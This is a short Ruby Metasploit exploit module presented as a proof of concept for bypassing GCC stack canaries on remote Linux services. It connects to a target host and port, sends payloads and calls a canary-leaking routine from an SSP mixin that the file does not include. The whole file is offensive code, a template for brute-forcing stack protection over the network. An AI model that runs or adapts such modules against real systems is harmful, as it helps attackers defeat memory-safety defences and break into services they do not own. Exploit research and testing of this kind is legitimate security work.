
require 'msf/core'
require 'msf/core/exploit/ssp'

class Metasploit4 < Msf::Exploit::Remote

	include Msf::Exploit::SSP
	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})

		super(update_info(info,
			'Name'           => 'SSP bypass example',
			'Description'    => %q{
				PoC to demonstrate how to use the ssp
				module to bypass GCC stack canaries.
			},
			'Version'        => '$Revision: 1.0$',
			'Author'         => [ 'deadbyte@toucan-system.com' ],
			'Platform'       => [ 'linux' ],
			'Targets'        => [
				[ 'Linux x86',
					{
						'Platform' => 'linux',
						'Arch' => ARCH_X86
					}
				],
				[ 'Linux x86_64',
					{
						'Platform' => 'linux',
						'Arch' => ARCH_X64
					}
				]
			],
			'Payload'        => { 'BadChars' => '' },
			'Stance'         => Msf::Exploit::Stance::Aggressive,
			'License'        => MSF_LICENSE,
			'DefaultTarget'  => 0))

		register_options(
		[
			Opt::RHOST,
			Opt::RPORT

		], self.class)
	end

	def exploit

		if datastore['SSP']

			print_status("SSP enabled")
			cookie = leak_cookie_value

			if cookie
				print_status("w00t")
			else
				print_status("Something went wrong")
			end
		else
			print_status("SSP disabled")
		end
	end

	#
	# implementing deliver_payload from Msf::Exploit::SSP
	#
	def deliver_payload (payload)

		connect

		begin

			if not sock.put(payload) or not sock.get_once
				raise "broken pipe"
			end

		rescue ::Exception
			disconnect
			return false;
		end

		disconnect
		return true;
	end
end

